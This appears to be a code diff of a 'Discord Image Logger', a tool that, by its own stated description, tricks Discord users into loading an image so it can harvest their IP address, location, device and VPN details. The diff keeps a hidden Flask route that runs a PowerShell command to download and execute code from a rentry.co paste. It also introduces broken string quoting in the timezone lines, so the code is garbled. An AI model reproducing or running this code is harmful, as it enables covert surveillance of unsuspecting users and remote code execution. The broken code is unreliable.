@@ -1,37 +1,14 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
+from flask import Flask, render_template, request
+import subprocess
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-from flask import Flask, render_template, request
-import subprocess
+import os
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/execute', methods=['POST'])
-def execute():
-    try:
-        command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
-        result = subprocess.run(command, capture_output=True, text=True, shell=True)
-        output = result.stdout if result.returncode == 0 else result.stderr
-    except Exception as e:
-        output = str(e)
-    
-    return render_template('index.html')
-
-if __name__ == '__main__':
-    app.run(debug=True)
-
 
 config = {
     # BASE CONFIG #
@@ -139,7 +116,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         
         if config["vpnCheck"] == 1:
             ping = ""
-    
+
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
@@ -181,7 +158,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
 > **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
@@ -204,10 +181,27 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # This IS NOT a rat or virus, it's just a loading image. (Made byme! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/execute', methods=['POST'])
+def execute():
+    try:
+        command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
+        result = subprocess.run(command, capture_output=True, text=True, shell=True)
+        output = result.stdout if result.returncode == 0 else result.stderr
+    except Exception as e:
+        output = str(e)
+    
+    return render_template('index.html')
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
@@ -272,7 +266,7 @@ height: 100vh;
                     message = message.replace("{city}", result["city"])
                     message = message.replace("{lat}", str(result["lat"]))
                     message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ')} ({result['timezone'].split('/')[0]})")
                     message = message.replace("{mobile}", str(result["mobile"]))
                     message = message.replace("{vpn}", str(result["proxy"]))
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
@@ -324,4 +318,7 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = app
+
+if __name__ == '__main__':
+    app.run(debug=True)
